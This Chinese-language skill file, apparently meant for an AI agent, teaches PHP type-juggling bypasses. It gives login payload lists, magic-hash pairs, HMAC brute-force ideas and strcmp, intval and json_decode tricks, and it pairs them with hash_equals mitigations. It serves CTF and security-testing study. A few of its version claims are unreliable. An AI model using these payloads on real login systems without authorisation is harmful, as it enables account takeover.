# 技能：PHP 类型转换 —— 弱比较与魔法哈希绕过

> **AI 加载指令**：PHP `==` 强制类型转换、魔法哈希（`0e…`）、HMAC/哈希松散检查、从错误类型获取 NULL，以及 CTF 风格的 `strcmp` / `json_decode` / `intval` 技巧。使用严格路由：映射汇点（`==` vs `hash_equals`）、PHP 主版本号，以及两个操作数是否受攻击者控制。路由提示：当你遇到 PHP 登录/签名逻辑或类似 `md5($_GET['x'])==md5($_GET['y'])` 的代码时，从本技能开始；如果已经使用 `hash_equals`/`===`，这条路径通常不适用。

## 0. 快速入门

**第一遍目标**：证明服务器分支通过强制类型转换将不相等的密钥/令牌视为相等，而不是猜测真实密码。

### 第一遍载荷（认证 / 令牌格式）

```text
password[]=x
password=
0
0e12345
240610708
QNKCDZO
true
[]
{"password":true}
admin%00
```

### 最小 PHP 探测（本地或实验室中的 `php -r`）

```php
<?php
// 松散比较探测 — 尽可能运行目标 PHP 主版本
var_dump('0e123' == '0e999');
var_dump('123a' == 123);

```

## 1. 弱比较 (`==`) — 真值表与版本

PHP 在不使用 `===` 或 `hash_equals()` 处理密钥的情况下，会进行类型转换比较操作数。

### 1.1 核心示例（字符串 vs 数字）

| 表达式 | 结果 | 机制（简述） |
|---|---|---|
| `'0010e2' == '1e3'` | **true** | 两个字符串看起来都是数字 → 按浮点数比较；都解析为 **1000.0**（不是零 — 常见考试陷阱；见下一行了解真正的“两个零”） |
| `'0e462097431906509019562988736854' == '0e830400451993494058024219903391'` | **true** | 都以科学计数法解析为 **0.0** |
| `'123a' == 123` | **true** | 字符串转换为整数时在第一个非数字处停止 → `123` |
| `'abc' == 0` | **true** (PHP **7.x 及更早版本**) | 非数字字符串与整数比较 → 字符串变为 `0` |
| `'' == 0` | **true** | 空字符串 → `0` |
| `'' == false` | **true** | 在松散规则中两者都是“falsy” |
| `false == NULL` | **true** | 松散等价 |
| `0 == false` | **true** | 松散等价 |
| `'' == 0 == false == NULL` | **true** (链式) | 每对相邻的值在 `==` 下都为 **true** (`''==0`, `0==false`, `false==NULL`) — 经典的“falsy”链 |
| `'0' == false` | **true** | 字符串 `'0'` 是唯一一个非空字符串与布尔值比较时为 false |
| `'php' == 0` | **false** (PHP **8+**) | PHP 8：非数字字符串**不再**等于 `0` |

### 1.2 PHP 5 vs 7 vs 8（高信号差异）

| 主题 | PHP 5.x / 7.x (典型) | PHP 8.0+ |
|---|---|---|
| `0 == "foo"` | **true** (字符串 → 0) | **false** |
| 字符串到数字的转换（`"123a"`） | 在许多 `==` 路径中仍会截断用于 `(int)` / 数字比较 | 同样适用于数字字符串；**非数字** vs 整数问题已在上文解决 |
| `md5([])` / `sha1([])` | 在旧模式中可能警告 / NULL 类似行为 | **TypeError** 对于错误类型 — 如果错误处理崩溃为 NULL 则会杀死经典 `[]` 技巧 |

**测试者要点**：始终注意从头部、`X-Powered-By` 或指纹中获取的**PHP 版本**；在 PHP 7 上工作的载荷可能在 PHP 8 上失效。

### 1.3 安全替代方案（防御 / 验证）

```php
hash_equals((string)$expected, (string)$actual);  // 时钟安全的、严格的字符串
// 或
$expected === $actual;
```

## 2. 魔法哈希（`0e…` + 仅数字）

当两边都是**看起来像哈希的字符串**且匹配 `^0e[0-9]+$` 时，PHP 将它们视为**科学计数法中的浮点数** → 值 **0.0**。然后 `md5(A) == md5(B)` 即使作为字符串的摘要不同也为 **true**。

### 2.1 参考表（MD5 / SHA-1 和更长的算法）

| 算法 | 示例输入 | 摘要（以 `0e` + 所有十进制数字开头） |
|---|---|---|
| **MD5** | `240610708` | `0e462097431906509019562988736854` |
| **MD5** | `QNKCDZO` | `0e830400451993494058024219903391` |
| **SHA-1** | `10932435112` | `0e07766915004133176347055865026311692244` |
| **SHA-224** | *(暴力破解 / 预计算)* | 示例形式：`0e` + 仅十进制数字 → 与另一个此类字符串比较 `==` 为 true |
| **SHA-256** | *(暴力破解 / 预计算)* | 相同模式：仅匹配 `^0e\d+$` 的字符串会碰撞在 `==` 下 |

**为什么它有效**：`md5('240610708') == md5('QNKCDZO')` → 两边都匹配 `^0e[0-9]+$` → 都被解释为 **0.0 == 0.0** → **true**。

### 2.2 代码中的利用模式

```php
if (md5($_GET['a']) == md5($_GET['b']) && $_GET['a'] != $_GET['b']) {
    // 意图：不同的字符串，相同的 md5（对 md5 来说不可能）
    // 实际：两个不同的字符串，其*摘要*是魔法哈希
}
```

### 2.3 载荷草图（配对搜索）

```text
?a=240610708&b=QNKCDZO
```

对于 SHA-224/256，将其视为**搜索问题**：暴力破解输入直到摘要匹配 `^0e\d+$`；将两个不同的输入配对。更长的哈希 = 更难；上述 MD5/SHA1 示例是典型的教学集。

## 3. HMAC 绕过（松散比较 vs `"0"` 或 `0`）

如果逻辑使用**松散**不等式与常量比较：

```php
if (hash_hmac('md5', $data, $key) != '0') { /* ok */ }
// 或 == 0, == false 与字符串 "0e…" 等
```

暴力破解**`$data`**（例如时间戳、nonce、计数器），直到 `hash_hmac` 输出匹配 **`^0e[0-9]+$`**（对于 MD5 输出）或代码的特定松散规则 — 然后哈希可能与 `0` 或另一个魔法摘要在 `==` 下相等。

### 示例（MD5 风格的 `0e` 摘要用于数字消息）

| 概念 | 示例 |
|---|---|
| 消息类型 | Unix 时间戳、递增 ID、毫秒时钟 |
| 时间戳暴力破解模式 | 教程有时引用 `1539805986` → `0e772967136366835494939987377058` 作为**魔法哈希风格**的示例；**`md5('1539805986')` 在标准 PHP 中不产生该摘要** — 使用该思路（扫描时间戳/计数器直到输出匹配 `^0e[0-9]+$`）并**始终在目标代码中验证确切的功能 + 密钥**。 |
| 目标 | 找到 `$data` 使得 `hash_hmac('md5', $data, $key)` 匹配 `^0e[0-9]+$` |
| 注意 | 在不知道 `$key` 的情况下，如果算法/输出在预言机中可见，你仍然可以暴力破解 **`$data`**；CTF 通常会泄露或固定密钥 |

```text
# 概念性：尝试许多时间戳
for t in range(T0, T1):
    if re.fullmatch(r'0e\d+', hmac_md5(str(t), key)):
        use t
```

**缓解措施**：`hash_equals($mac, $expected)` + 固定长度的十六进制/二进制编码；永远不要将 HMAC 与裸 `"0"` 比较。

## 4. NULL 搓揉（数组 & 类型错误）

无效类型可以在比较的一侧产生 **`NULL`**；与另一个 `NULL` 或强制转换值松散等价可能通过。

| 调用 | 典型 PHP 7/8 行为 |
|---|---|
| `md5([])` | PHP 8: **TypeError**；旧版本：警告 / 跨版本不可靠 |
| `sha1([])` | 相同 |
| **思路** | 如果错误处理程序或自定义包装器将失败转换为 **`NULL`**，则 `NULL == NULL` 或 `NULL == sha1("x")` 如果另一侧也是 NULL |

```php
// CTF / 代码错误模型：
@sha1($_GET['x']) == @sha1($_GET['y']);  // 如果两边都错误为 NULL → true
```

**实际审计**：寻找 **`@`**、设置哈希为 `null` 的自定义 `try/catch`，或用户输入传递到需要字符串的位置。

## 5. CTF 模式

### 5.1 `strcmp` / `strcasecmp` 与数组

```php
strcmp([], "password");  // PHP 7/8 中的 NULL (无效参数)
// NULL == 0  → 在松散比较中为 true 如果代码执行：
if (strcmp($_GET['p'], $secret) == 0)
```

载荷：

```text
?p[]=1
```

### 5.2 `intval` 绕过

```php
// 十六进制：以 base 0 允许 PHP 解释 0x 前缀（版本依赖；始终在目标上验证）
intval("0x1A", 0);   // → 26

// 八进制：前导 0 可以被解析为八进制与 base 0
intval("010", 0);  // → 8 (经典教学示例；在目标 PHP 上确认)
// 科学计数法：`intval()` 单独在 'e' 处停止；先通过浮点转换
intval((float) "1e2"); // → 100
```

```text
?id=0x1A
?id=010
?id=1e2
```

### 5.3 `json_decode` + `true` 用于关联数组认证

```json
{"password": true}
```

```php
$j = json_decode($input, true);
if ($j['password'] == $stored_string) // true == "非空" 通常为 true — 见 PHP 松散规则
```

### 5.4 `is_numeric` + 松散比较

```php
is_numeric("0e12345");  // true
"0e12345" == 0;         // true (科学计数法 → 0.0)
```

### 5.5 反序列化 + 魔法属性

将用户输入反序列化到对象的 `__toString` 或属性，这些属性会传递到 `md5($obj)` 或松散比较 — 结合**魔法哈希**字符串属性（CTF）。寻找 `unserialize($_…)` 靠近哈希上的 `==`。
